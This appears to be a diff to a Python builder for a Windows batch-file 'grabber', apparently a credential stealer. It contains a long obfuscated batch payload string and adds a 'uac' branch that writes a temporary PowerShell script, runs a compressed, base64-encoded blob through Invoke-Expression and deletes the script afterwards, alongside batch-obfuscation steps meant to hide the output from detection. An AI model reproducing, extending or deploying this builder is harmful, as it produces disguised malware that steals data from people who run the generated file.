@@ -66,8 +66,7 @@ def music():
     music = os.path.join(os.getcwd(), f'utils\{choice}.mp3')
     playsound(music)
 
-code = r"""
-@%BsTjYW%e%Yw%c%oMRJ%h%mpwxRV%o%r% %PpxghDWC%o%sJFw%f%zL%f%KPaqjYUml%
+code = r"""@%BsTjYW%e%Yw%c%oMRJ%h%mpwxRV%o%r% %PpxghDWC%o%sJFw%f%zL%f%KPaqjYUml%
 s%GsG%e%zLliUkhtBP%t%OCdPdukm% %G%"%M%n%xVYB%=%htgbc%a%AHGSkuOt%"%cWPkUXY% %jHN%&%mSEFVmwhB% %wCwvpN%s%qnRPksp%e%RtNbgN%t%tENlw% %kZ%"%O%o%GUo%=%U%b%PXcIWyx%"%xZXeJJbSOw% %oH%&%Gveeq% %wTar%s%cPujhYVk%e%rgT%t%F% %uxOzwjmWCk%"%PpJqM%p%XCPobSQa%=%sWOrVWkU%c%Yd%"%Yp% %h%&%Y% %VqiRIeY%s%fsCj%e%rrC%t%DnAv% %YDVZfnN%"%vY%q%xftUMWAL%=%nTXw%d%ZizUevOxC%"%XRgi% %CQJUDanjc%&%SFsJIRtX% %XeOwyVvJ%s%bol%e%VDanqAb%t%CcXh% %CX%"%DtUqbcj%r%NRKntk%=%OGORwoB%e%iUaeuklpL%"%NXioiWvXp% %XlFWJNj%&%pa% %yGY%s%vC%e%lxoixrd%t%wPK% %JsFAUsTHL%"%BFFmAPvB%s%Oe%=%jfwcxtJtj%f%t%"%zwtxbxJpl% %yxAlXnFrF%&%DHqTlfc% %vHTHBkru%s%dimWOIEuIe%e%NNE%t%OtsavnA% %MEIMoiJA%"%cb%t%MeNzRb%=%FiBqAB%g%UAmVXKUUGs%"%AgCaOGiqkw% %muIJ%&%EcNswqXH% %tsae%s%CqFNeRrg%e%IeYBwkea%t%ugSIbgDcc% %TyFMH%"%jqY%u%PsZcTHUg%=%lWlVZBZ%h%JxuQAfGrm%"%FTmejsEMr% %gG%&%eVYePY% %nJGK%s%R%e%MQC%t%BX% %BHEtDmX%"%Uf%v%T%=%KZAlCUn%i%QPlj%"%XNACF% %EgWVabVW%&%sYdcNNS% %T%s%gsm%e%qTfauXT%t%XXDEFnk% %QurcdzbQw%"%Ki%w%RpzmJSrkU%=%QVLCvby%j%sNQSQV%"%vLlFepLqso% %DxZAxw%&%kNm% %ejoRex%s%zdIaL%e%DYmnhxWjz%t%japQGsqbiE% %wwxK%"%vMNS%x%w%=%K%k%dm%"%ekenHpqFOT% %AhlAffgu%&%BYB% %MmYqRP%s%TFFTiFL%e%pntr%t%IzsrD% %UUKbZtOgbo%"%VdpWCqD%y%WOh%=%AP%l%aaturbsi%"%GN% %jjrXCFOCd%&%ZXW% %ZZ%s%xSEeoRd%e%dBxGYOEE%t%ktBtjzXQ% %wMb%"%sPTHZ%z%wattG%=%G%m%OrBhx%"%jUhQprmKFO% %Mr%&%ikIvavmFkL% %IhkXpLMQe%s%Mhsoada%e%TjJiRO%t%uziQPk% %ZCvUNaf%"%g%a%sUlnaI%=%PEYZAW%n%FXGarBpWN%"%OQZ% %jbLqZBr%&%woFwCthzRn% %obVE%s%eJCfQgIBY%e%IfrLM%t%j% %OPKBMXifJg%"%dxpCADaJD%b%fiw%=%sYzVwe%o%ELxWd%"%ouTDcAYPVG% %cXtZD%&%QfMFnO% %f%s%WIHq%e%HjP%t%IJOaqFI% %vS%"%ceWEDrmYC%c%HttdmbBs%=%XzCbCo%p%aSMWeAFMG%"%tkbpHLBhW% %iK%&%lsZNqRsYjp% %s%s%JJamBDHJmK%e%XtunKrLa%t%lx% %nKFAM%"%nbTKhRKEtn%d%VG%=%jQwiwe%q%utADhM%"%yemdGfhjG% %fEgrfh%&%cOsZeNS% %Vq%s%kXPfezMJX%e%CEBFXGTdxK%t%xcJ% %hdNNSSH%"%Ej%e%UHleVScE%=%KpJdBos%r%vWooKR%"%PafXzmzIHo% %woJaxplOtN%&%JjVXWvKy% %CDzV%s%NTlxkzgb%e%WQfNBT%t%cwTgijFgRv% %COKsmv%"%pFgmElcI%f%fF%=%WuXuT%s%MXMeQvWBT%"%uYeKLaHJnR% %MW%&%G% %CvPelot%s%L%e%yJRe%t%VITwKGf% %GZZADZnS%"%QTRYolgGjq%g%mTiqwxfq%=%kgzD%t%QwjEVC%"%w% %gbGHzyrdhr%&%ZcGRk% %F%s%UHGdWRI%e%ivzt%t%UTbGkdTI% %AKoPCLe%"%XVGf%h%tQavsGYy%=%fanxofD%u%OpLMV%"%TIUrsO% %dUuk%&%eBQbcEJaL% %aKURflYHII%s%Vmz%e%gVB%t%Jj% %pnDveTKEJ%"%KVUlDWnr%i%uxT%=%ozv%v%nHMwFOrE%"%Y% %YzSbPp%&%wbSUXIcKM% %VB%s%YN%e%FlQuiZ%t%HahgLPptN% %mkNQKf%"%rkY%j%BKKLxiE%=%HexePIwzi%w%qWQ%"%mtEFLAG% %K%&%O% %eUwzjdk%s%TBvFEv%e%lCfpOFY%t%LT% %pxpneVc%"%jFkOKLX%k%hLqa%=%mXAEr%x%ymnWlF%"%SDZIS% %sHMwOpwr%&%VMapcGEM% %rmFpxihl%s%WWupRCSo%e%xGi%t%xNcRBsZ% %abrQ%"%cLck%l%dOrVitl%=%no%y%bMctg%"%QPobMZw% %VivpQ%&%gX% %claK%s%oCW%e%qlZwGAf%t%xuvtq% %BAo%"%NtcRhEj%m%XjnYErLH%=%lfMnMoXSGC%z%utmnv%"%P% %rLAlA%&%wGTrRJ% %FGj%s%IMamLZI%e%JtJ%t%Zm% %palwQvo%"%JP%N%YYjD%1%xl%=%Yk%A%Viutbi%"%ocifPbziy% %xjukWw%&%WleqQCQlpI% %nFXu%s%CMOk%e%fdFdPJasP%t%N% %poSVUSjaWd%"%keo%O%LnYMMOCo%1%tceWZ%=%gj%B%GFXagWOfON%"%EVQPV% %LFZZxmT%&%vpEnit% %agBshjn%s%zCxeSvT%e%dcBIYy%t%dACaxa% %bL%"%XZRZUza%P%zzc%1%axlibOPo%=%ZHlPXe%C%gxKMHhTFdr%"%JPDuljgRwn% %H%&%COGu% %yRCuFpM%s%utyjIXUOz%e%I%t%hyDajz% %BEnvzc%"%WNOJdtzCMd%Q%oLwWxeJGmm%1%YIvDKIqqY%=%uXprP%D%pmuWbXwL%"%yhsGNmg% %rnV%&%UyF% %EnzztjIDwV%s%ykKy%e%otxNarlJgV%t%JbOl% %zk%"%nnEJui%R%lrTraqRKER%1%Crfs%=%OgozrRi%E%wXdgJEiNmV%"%dvZ% %sfxFLaLgG%&%GqZGuaEzyy% %e%s%FNuxIw%e%cOaosyNGxO%t%MFZTLrnh% %uzNBO%"%LsEsS%S%ahIYTtzVpH%1%pyngDfaEH%=%TIPVWp%F%fYdSxE%"%tNUzut% %YyJdzCdMR%&%BLO% %pa%s%jBMMgMQy%e%jiVFUZWodJ%t%wbduc% %XLH%"%GAjfxn%T%UHJjUO%1%gIpskgeA%=%EgwKPli%G%aapXragQv%"%sUQHpK% %zivhMl%&%Z% %EHjYDHEjRC%s%QJkItFwXHn%e%jFZTOgg%t%q% %Us%"%LLxAmQ%U%tlGEogoh%1%TAVd%=%yCsvgN%H%Z%"%RXNTfxZDlX% %Uu%&%QlCGcB% %QGFYjClFV%s%tOIKVi%e%WEmxzJ%t%DfWXXmi% %PkMtcWD%"%omY%V%x%1%rewpPHcDn%=%nwKhdzV%I%MEbRSlz%"%MJL% %SaFUSJLAE%&%VsR% %wgclxn%s%YQUIW%e%EZ%t%Qwd% %MTI%"%GesuHBFtB%W%lG%1%ABUoFXFy%=%h%J%tZiBwxpJp%"%xNBZZ% %rfBrrYLKt%&%xifGAPl% %jgGMnzZc%s%ZSoYZshshb%e%BMRMSVr%t%FD% %SymUE%"%h%X%FsbnkdTf%1%aKTEWQJyb%=%tUUonuC%K%hzIeR%"%SWWbmr% %Fxf%&%RyCuQB% %AVKKNwN%s%wQ%e%gKkfOF%t%tc% %f%"%eJaYGl%Y%nFmdKkGxC%1%LeymJg%=%XvPkNTlpX%L%zTOOEhFyxC%"%wqZvtNPj% %FGUlKrDUAT%&%fwISZ% %Io%s%Hmsrd%e%nTbAvQ%t%LTO% %PPtTRwxq%"%Gxb%Z%cuieDUVk%1%suNWIR%=%pgJu%M%GvaPZfycf%"%odbyzIpIY% %CAB%&%ZwoCdaWTQZ% %uGeDuLNHvV%s%vobWwgZrTk%e%v%t%waJOrGnAf% %RLixdDSKO%"%W%A%kfbaEzJ%1%QjT%=%tiyHsB%N%tYdBI%"%bSacSSPOoH% %ZO%&%E% %jZZn%s%FA%e%C%t%a% %sNpEEy%"%GMkrkrbIQ%B%cdgxkh%1%XkUv%=%KsxFnpnpq%O%bxd%"%GxPIuOqau% %Eo%&%lOrU% %M%s%YAkAoKRqMb%e%uRONNsRBEV%t%mmRvz% %Cen%"%vsRrFbFcb%C%GoAdckzQ%1%ErIvSHiq%=%Q%P%EBQzXMScD%"%gy% %SF%&%jIKXBVw% %TJKonr%s%PMMA%e%eh%t%Av% %lgWfjA%"%A%D%f%1%mUq%=%fdLggFvI%Q%pCO%"%KN% %OmcdwA%&%dkaeKs% %cLxnsom%s%XnH%e%bYsS%t%noLNBgTte% %p%"%lXhhgHIJ%E%eG%1%uXP%=%uGv%R%jjQGqlDW%"%EQZ% %YXGlRr%&%AFFPwNE% %QjTThPR%s%ptBRoCdOEr%e%Xx%t%JHrob% %WMBUhfzhuz%"%AIKIichP%F%bg%1%VzKei%=%pw%S%jVM%"%EC% %HD%&%lh% %zvITTUByC%s%cH%e%VEEwVWBZPW%t%pBxRzFQAn% %kVeMWcb%"%h%G%dadhJSzEg%1%CuZ%=%Yhv%T%trkk%"%tkhYer% %zXQACiiIfT%&%rcLIKYFNDJ% %SzHSMh%s%wjaBhBuh%e%jJsep%t%mAWkiemgs% %JM%"%xZ%H%jLxp%1%qLYEuLV%=%WCTvEGAm%U%MQGzAuuDMD%"%KuGGM% %FiKoykvFjH%&%ijh% %Aas%s%XBeJVr%e%TgxhnUA%t%zjvtUeTL% %FbxxK%"%defZO%I%OMljVPus%1%qwirA%=%hqpU%V%AHoeYtdLx%"%sHcmFr% %OzvauWr%&%UzaJ% %lR%s%WP%e%ejVGxmgI%t%uoyI% %AWtuzhKBg%"%utHwpbn%J%Gn%1%TH%=%Qompld%W%PctfWtRdEq%"%QFG% %iceMp%&%ZKyKRiX% %m%s%jBUzlgYUI%e%AYZbmRMHfC%t%Hn% %gk%"%PyU%K%qcMqCzJ%1%gGDlg%=%kuZwNhgaJ%X%FMUDegc%"%oFyaUHUMRC% %TF%&%mcjRcM% %FEBK%s%XnModL%e%JrY%t%o% %o%"%xB%L%necHVuTobe%1%gfB%=%XNn%Y%bDMrpTay%"%BQZGfq% %kRbswp%&%F% %k%s%AqaPahJ%e%XWdPiblnLJ%t%pEWltZGzQL% %WmfeI%"%kGCLReM%M%BcvXbRJNSO%1%wZ%=%kIFSCmXb%Z%aO%"%vahjqvOJe% %mTSSMuCl%&%dPPA% %e%s%KScIJtMBU%e%KsWApz%t%EaFCHKgXT% %Vatz%"%hZADV%l%FVrja%u%eP%l%icZHugoOP%=%TBDCxYz%:%h%"%OWBYkpe%
 """
 
@@ -238,29 +237,36 @@ class builder:
                                     with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                         f.write(char) # spent like 2 hours trying to fix this and found baums again :sob: https://github.com/baum1810/batchobfuscator
 
-        with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
+        with open(f'{self.file}.bat.obfuscated.bat', 'r', encoding='utf-8') as f:
             all_stuff = f.read()
-        new_stuff = all_stuff.replace("%~f0%", "%~f0")
-        new_stuff = new_stuff.replace("%~dp0%", "%~dp0")
-        new_stuff = new_stuff.replace("%~dpn0%", "%~dpn0")
+        all_stuff = all_stuff.replace("%~f0%", "%~f0")
+        all_stuff = all_stuff.replace("%~dp0%", "%~dp0")
+        all_stuff = all_stuff.replace("%~dpn0%", "%~dpn0")
         #I just did most common ones. If you want more, just add them here.
         with open(f'{self.file}.bat.obfuscated.bat', 'w', encoding='utf-8') as f:
-            f.write(new_stuff)
+            f.write(all_stuff)
 
         if self.grabber_type == "uac":
             with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
                 data = f.readlines()
+                data[9] = ":no_uac\n"
+                data[10] = "cd %userprofile%\AppData\Local\Temp\n"
+                data[11] = "powershell $command = 'Start-Process %~f0'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $Encodedcommand =[Convert]::ToBase64String($Bytes); $Encodedcommand > test.txt\n"
+                data[12] = "set /p base64code=<%userprofile%\AppData\Local\Temp\\test.txt\n"
+                data[13] = "del %userprofile%\AppData\Local\Temp\\test.txt\n"
+                data[14] = '''echo $code = "%base64code%" > %userprofile%\AppData\Local\Temp\penis.ps1\n'''
+                data[15] = "echo (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) ^| ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) ^| InVoKE-expREssION >> %userprofile%\AppData\Local\Temp\penis.ps1\n"
+                data[16] = "powershell.exe -executionpolicy remotesigned -File %userprofile%\AppData\Local\Temp\penis.ps1 && del %userprofile%\AppData\Local\Temp\penis.ps1\n"
+                data[17] = "del %userprofile%\AppData\Local\Temp\penis.ps1\n"
+                data[18] = "exit\n"
+            with open(f'{self.file}.bat.obfuscated.bat', 'w', encoding='utf-8') as f:
+                f.writelines(data)
 
         elif self.grabber_type == "n":
             print("No modifications needed for non-uac grabber")
         else:
             print(Colorate.Color(Colors.red, "Invalid option", False))
             builder()
-
-        with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
-            everything = f.read()
-        with open(f'{self.file}.bat.obfuscated.bat', 'w+', encoding='utf-8') as f:
-            f.write(f"{code}\n{everything}")
 
         out_hex = []
 
